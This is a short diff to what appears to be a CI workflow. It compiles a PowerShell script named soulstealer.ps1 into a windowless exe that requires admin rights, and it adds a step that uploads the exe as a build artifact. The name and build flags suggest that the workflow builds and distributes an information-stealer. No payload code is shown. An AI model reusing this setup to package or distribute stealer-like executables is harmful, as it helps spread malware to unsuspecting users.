@@ -24,3 +24,9 @@ jobs:
         run: |
           # Без иконки
           Invoke-ps2exe .\soulstealer.ps1 .\soulstealer.exe -noConsole -requireAdmin
+
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: soulstealer-exe
+          path: soulstealer.exe
